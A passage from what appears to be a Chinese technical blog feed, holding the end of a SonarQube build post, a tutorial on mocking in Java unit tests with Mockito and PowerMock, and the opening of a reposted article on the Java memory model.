title="3、构建项目"></a>3、构建项目</h3><p>回到主页找到需要配置的项目，如果没有则需要新建项目，这里不赘述如何创建。选中项目配置sonar(这里使用</p><p>sonar-scanner)。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_20.png" alt="1564124297347"></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_21.png" alt="1564123835385"></p><p>在构建历史中可以看到运行中的构建，点进去查看信息：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_22.png" alt="1564124138444"></p><p>另外一种方式是使用maven命令打包，此时需要配置setting.xml，配置见前文。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_23.png" alt="1564128857055"></p><h3 id="4、查看结果"><a href="#4、查看结果" class="headerlink" title="4、查看结果"></a>4、查看结果</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/sonarqube_24.png" alt="1564124244878"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sonarQube </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mockito和PowerMock用法</title>
      <link href="/powermock/"/>
      <url>/powermock/</url>
      
        <content type="html"><![CDATA[<p> 在单元测试中，我们往往想去独立地去测一个类中的某个方法，但是这个类可不是独立的，它会去调用一些其它类的方法和service，这也就导致了以下两个问题：外部服务可能无法在单元测试的环境中正常工作，因为它们可能需要访问数据库或者使用一些其它的外部系统。我们的测试关注点在于这个类的实现上，外部类的一些行为可能会影响到我们对本类的测试，那也就失去了我们进行单测的意义。</p><a id="more"></a><h2 id="一、mock测试和Mock对象"><a href="#一、mock测试和Mock对象" class="headerlink" title="一、mock测试和Mock对象"></a>一、mock测试和Mock对象</h2><p>mock对象就是在调试期间用来作为真实对象的替代品<br>mock测试就是在测试过程中，对那些不容易构建的对象用一个虚拟对象来代替测试的方法就叫mock测试</p><h2 id="二、Mockito和PowerMock"><a href="#二、Mockito和PowerMock" class="headerlink" title="二、Mockito和PowerMock"></a>二、Mockito和PowerMock</h2><p>  PowerMock是Java开发中的一种Mock框架，用于单元模块测试。当你想要测试一个service接口，但service需要经过防火墙访问，防火墙不能为你打开或者你需要认证才能访问。遇到这样情况时，你可以在你能访问的地方使用MockService替代，模拟实现获取数据。<br>  PowerMock可以实现完成对private/static/final方法的Mock（模拟），而Mockito可以对普通的方法进行Mock，如：public等。</p><h2 id="三、Mockito的使用"><a href="#三、Mockito的使用" class="headerlink" title="三、Mockito的使用"></a>三、Mockito的使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、模拟HttpServletRequest对象，不需要依赖web容器，模拟获得请求参数</span></span><br><span class="line">HttpServletRequest request = mock(HttpServletRequest.class); </span><br><span class="line">when(request.getParameter(<span class="string">&quot;foo&quot;</span>)).thenReturn(<span class="string">&quot;boo&quot;</span>);</span><br><span class="line"><span class="comment">// 注意:mock()是Mockito的静态方法，可以用@mock注解替换</span></span><br><span class="line"><span class="keyword">private</span> <span class="meta">@mock</span> HttpServletRequest request</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2、Person person =mock(Person.class);</span></span><br><span class="line"><span class="comment">// 第一次调用返回&quot;xiaoming&quot;，第二次调用返回&quot;xiaohong&quot;</span></span><br><span class="line">when(person.getName()).thenReturn(<span class="string">&quot;xiaoming&quot;</span>).thenReturn(<span class="string">&quot;xiaohong&quot;</span>); </span><br><span class="line">when(person.getName()).thenReturn(<span class="string">&quot;xiaoming&quot;</span>, <span class="string">&quot;xiaohong&quot;</span>); </span><br><span class="line">when(person.getName()).thenReturn(<span class="string">&quot;xiaoming&quot;</span>); </span><br><span class="line">when(person.getName()).thenReturn(<span class="string">&quot;xiaohong&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3、mockito模拟测试无返回值的方法</span></span><br><span class="line">Person person =mock(Person.class);</span><br><span class="line">doNothing().when(person).remove();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4、mockito还能对被测试的方法强行抛出异常</span></span><br><span class="line">Person person =mock(Person.class);</span><br><span class="line">doThrow(<span class="keyword">new</span> RuntimeException()).when(person).remove();</span><br><span class="line">when(person.next()).thenThrow(<span class="keyword">new</span> RuntimeException());</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5、//UserAppService用于参数匹配器的demo</span></span><br><span class="line">参数匹配器</span><br><span class="line">    UserApp app = <span class="keyword">new</span> UserApp();</span><br><span class="line">    app.setAppKey(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">    app.setAppSecret(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">    when(userAppMapper.getAppSecretByAppKey(argThat(<span class="keyword">new</span> ArgumentMatcher&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(Object argument)</span> </span>&#123;</span><br><span class="line">            String arg = (String) argument;</span><br><span class="line">            <span class="keyword">if</span> (arg.equals(<span class="string">&quot;1234567890&quot;</span>) || arg.equals(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;))).thenReturn(app);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6、Answer接口模拟根据参数返回不同结果</span></span><br><span class="line">    when(userAppMapper.getAppSecretByAppKey(anyString())).thenAnswer(</span><br><span class="line">            (InvocationOnMock invocationOnMock) -&gt; &#123;</span><br><span class="line">                String arg = (String) invocationOnMock.getArguments()[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">null</span> == arg || arg.equals(<span class="keyword">null</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>)) &#123;</span><br><span class="line">                    UserApp app = <span class="keyword">new</span> UserApp();</span><br><span class="line">                    app.setAppKey(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">                    app.setAppSecret(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> app;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7、Mock对象是能调用模拟方法，调用不了它真实的方法，但是spy() 或者@spy 可以监视一个真实的对象，对它进行方法调用时它将调用真实的方法，同时也可以设定这个对象的方法让它返回我们的期望值。同时，我们也可以用verify进行验证。</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">goHome</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;I say go go go!!&quot;</span>); </span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">   &#125;  </span><br><span class="line"> &#125;</span><br><span class="line">  <span class="comment">//  当需要整体Mock，只有少部分方法执行真正部分时，选用这种方式 </span></span><br><span class="line">   A mockA = Mockito.mock(A.class);   </span><br><span class="line">   Mockito.doCallRealMethod().when(mockA).goHome(); </span><br><span class="line">  <span class="comment">// 当需要整体执行真正部分，只有少部分方法执行mock，选用这种方式  </span></span><br><span class="line">   A spyA = Mockito.spy(<span class="keyword">new</span> A());   </span><br><span class="line">   Mockito.when(spyA.goHome()).thenReturn(<span class="keyword">false</span>); </span><br></pre></td></tr></table></figure><p><strong>Demo演示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标测试类</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAppService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserAppMapper userAppMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过appKey查询AppSecre</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAppSecretByAppKey</span><span class="params">(String appKey)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(appKey)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        UserApp userApp = userAppMapper.getAppSecretByAppKey(appKey);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == userApp) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> userApp.getAppSecret();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAppServiceTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@InjectMocks</span> <span class="comment">//创建一个实例，其余用@Mock（或@Spy）注解创建的mock将被注入到用该实例中</span></span><br><span class="line">    <span class="keyword">private</span> UserAppService userAppService;</span><br><span class="line">    <span class="meta">@Mock</span></span><br><span class="line">    <span class="keyword">private</span> UserAppMapper userAppMapper;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span> </span>&#123; MockitoAnnotations.initMocks(<span class="keyword">this</span>);  &#125;<span class="comment">//初始化Mock对象</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAppSecretByAppKey3</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        when(userAppMapper.getAppSecretByAppKey(anyString())).thenAnswer(</span><br><span class="line">                (InvocationOnMock invocationOnMock) -&gt; &#123;</span><br><span class="line">                    String arg = (String) invocationOnMock.getArguments()[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">null</span> == arg || arg.equals(<span class="keyword">null</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>)) &#123;</span><br><span class="line">                        UserApp app = <span class="keyword">new</span> UserApp();</span><br><span class="line">                        app.setAppKey(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">                        app.setAppSecret(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> app;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;);</span><br><span class="line">        assertEquals(userAppService.getAppSecretByAppKey(<span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>), <span class="string">&quot;q1w2e3r4t5y6u7i8o9p0&quot;</span>);</span><br><span class="line">        assertEquals(userAppService.getAppSecretByAppKey(<span class="string">&quot;123456789&quot;</span>), <span class="keyword">null</span>);</span><br><span class="line">        assertEquals(userAppService.getAppSecretByAppKey(<span class="keyword">null</span>), <span class="keyword">null</span>);</span><br><span class="line">        verify(userAppMapper, only()).getAppSecretByAppKey(anyString());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 注意：verify记录着这个模拟对象调用了什么方法，调用了多少次，never() 没有被调用，相当于 times(0)，atLeast(N) 至少被调用 N 次，atLeastOnce() 相当于 atLeast(1)，atMost(N) 最多被调用 N 次</span></span><br><span class="line"><span class="comment">// 参数匹配也可以为：verify(mock).someMethod(anyInt(), anyString()); </span></span><br></pre></td></tr></table></figure><h2 id="四、PowerMock的使用"><a href="#四、PowerMock的使用" class="headerlink" title="四、PowerMock的使用"></a>四、PowerMock的使用</h2><p>PowerMock基于Mockito开发，起语法规则与Mockito一致，主要区别在于使用方面，以实现完成对<strong>private/static/fina</strong>l等方法(也支持mock的对象是在方法内部new出来的)的Mock（模拟）。具体事例如下：</p><p><strong>依赖</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.powermock<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>powermock-module-junit4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;powermock.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>objenesis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.objenesis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.powermock<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>powermock-api-mockito<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;powermock.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//2、 PowerMock有两个重要的注解：</span><br><span class="line">      –@RunWith(PowerMockRunner.class)</span><br><span class="line">      –@PrepareForTest( &#123; YourClassWithEgStaticMethod.class &#125;)</span><br><span class="line">     // 如果你的测试用例里没有使用注解@PrepareForTest，那么可以不用加注解@RunWith(PowerMockRunner.class)，反之亦然。当你需要使用PowerMock强大功能（Mock静态、final、私有方法等）的时候，就需要加注解@PrepareForTest。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassUnderTest</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callArgumentInstance</span><span class="params">(File file)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> file.exists();  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callFinalMethod</span><span class="params">(ClassDependency refer)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> refer.isAlive();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callStaticMethod</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> ClassDependency.isExist();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callPrivateMethod</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">       <span class="keyword">return</span> ClassDependency.delete(); </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//依赖类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassDependency</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isExist</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isAlive</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function">priavte <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2、Mock方法内部new出来的对象</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCallInternalInstance</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line">    File file = PowerMockito.mock(File.class);  </span><br><span class="line">    ClassUnderTest underTest = <span class="keyword">new</span> ClassUnderTest();  </span><br><span class="line">    PowerMockito.whenNew(File.class).withArguments(&quot;bbb&quot;).thenReturn(file);  </span><br><span class="line">    PowerMockito.when(underTest.callArgumentInstance( <span class="keyword">new</span> File(<span class="string">&quot;bbb&quot;</span>))).thenReturn(<span class="keyword">true</span>);  </span><br><span class="line">    PowerMockito.when(file.exists()).thenReturn(<span class="keyword">true</span>); </span><br><span class="line">    Assert.assertTrue(file.exists(); </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3、Mock普通对象的final方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCallFinalMethod</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    ClassDependency depencency = PowerMockito.mock(ClassDependency.class);  </span><br><span class="line">    ClassUnderTest underTest = <span class="keyword">new</span> ClassUnderTest();  </span><br><span class="line">    PowerMockito.when(depencency.isAlive()).thenReturn(<span class="keyword">true</span>);  </span><br><span class="line">    Assert.assertTrue(underTest.callFinalMethod(depencency)); </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4、Mock静态方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCallStaticMethod</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    ClassUnderTest underTest = <span class="keyword">new</span> ClassUnderTest();  </span><br><span class="line">    PowerMockito.mockStatic(ClassDependency.class);  </span><br><span class="line">    PowerMockito.when(ClassDependency.isExist()).thenReturn(<span class="keyword">true</span>);  </span><br><span class="line">    Assert.assertTrue(underTest.callStaticMethod());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5、Mock私有方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCallPrivateMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line">    ClassUnderTest underTest = PowerMockito.mock(ClassUnderTest.class);  </span><br><span class="line">    PowerMockito.when(underTest,<span class="string">&quot;callPrivateMethod&quot;</span>).thenCallRealMethod(); </span><br><span class="line">    Assert.assertTrue(underTest.callPrivateMethod());  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 单元测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 内存模型</title>
      <link href="/java%20memory%20model/"/>
      <url>/java%20memory%20model/</url>
      
        <content type="html"><![CDATA[<p>在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步（这里的线程是指并发执行的活动实体）。通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种：共享内存和消息传递。</p> <a id="more"></a><blockquote><p>作者：程晓明</p><p>出处:<a href="https://www.infoq.cn/article/java-memory-model-1">https://www.infoq.cn/article/java-memory-model-1</a></p></blockquote><h2 id="并发编程模型的分类"><a href="#并发编程模型的分类" class="headerlink" title="并发编程模型的分类"></a><font color=  #8EE5EE  >并发编程模型的分类</font></h2><p>在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步（这里的线程是指并发执行的活动实体）。通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种：共享内存和消息传递。</p><p>在共享内存的并发模型里，线程之间共享程序的公共状态，线程之间通过写 - 读内存中的公共状态来隐式进行通信。在消息传递的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信。</p><p>同步是指程序用于控制不同线程之间操作发生相对顺序的机制。在共享内存并发模型里，同步是显式进行的。程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。</p><p>Java 的并发采用的是共享内存模型，Java 线程之间的通信总是隐式进行，整个通信过程对程序员完全透明。如果编写多线程程序的 Java 程序员不理解隐式进行的线程之间通信的工作机制，很可能会遇到各种奇怪的内存可见性问题。</p><h2 id="Java-内存模型的抽象"><a href="#Java-内存模型的抽象" class="headerlink" title="Java 内存模型的抽象"></a><font color=  #8EE5EE  >Java 内存模型的抽象</font></h2><p>在 java 中，所有实例域、静态域和数组元素存储在堆内存中，<font color= #FF1493    >堆内存在线程之间共享</font>（本文使用“共享变量”这个术语代指实例域，静态域和数组元素）。<font color= #FF1493    >局部变量（Local variables），方法定义参数（java 语言规范称之为 formal method parameters）和异常处理器参数（exception handler parameters）不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响</font>。</p><p>Java 线程之间的通信由 Java 内存模型（本文简称为 JMM）控制，JMM 决定一个线程对共享变量的写入何时对另一个线程可见。从抽象的角度来看，JMM 定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读 / 写共享变量的副本。本地内存是 JMM 的一个抽象概念，并不真实存在。它涵盖了<font color= #FF1493    >缓存</font>，<font color=#EE82EE >写缓冲区</font>，<font color= #8A2BE2 >寄存器</font>以及其他的硬件和编译器优化。Java 内存模型的抽象示意图如下：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/b098a84eb7598d70913444a991d1759b.png" alt="img"></p><p>从上图来看，线程 A 与线程 B 之间如要通信的话，必须要经历下面 2 个步骤：</p><ol><li>首先，线程 A 把本地内存 A 中更新过的共享变量刷新到主内存中去。</li><li>然后，线程 B 到主内存中去读取线程 A 之前已更新过的共享变量。</li></ol><p>下面通过示意图来说明这两个步骤：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/2c452d147bf0d09b14b770d3990740cb.png" alt="img"></p><p>如上图所示，本地内存 A 